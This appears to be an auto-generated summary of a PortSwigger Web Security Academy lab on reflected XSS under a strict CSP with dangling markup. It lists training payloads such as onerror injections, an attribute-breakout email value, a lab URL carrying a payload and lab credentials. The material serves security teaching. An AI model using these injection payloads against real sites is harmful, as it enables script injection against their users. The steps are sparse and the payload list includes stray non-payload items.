## Reflected XSS protected by very strict CSP, with dangling markup attack

**Category:** xss_reflected
**Difficulty:** Unknown

### Description
This lab uses a strict CSP that prevents the browser from loading subresources from external domains.

### Solution Steps
You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

### Key Payloads
- `hacker@evil-user.net`
- `<a href="">Click me</a>`
- `wiener:peter`
- `<img src onerror=alert(1)>`
- `email input`
- `email`
- `text`
- `foo@example.com"><img src= onerror=alert(1)>`
- `https://YOUR-LAB-ID.web-security-academy.net/my-account?email=<img src onerror=alert(1)>`
- `form-action`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: xss_reflected

---
*Source: PortSwigger Web Security Academy*
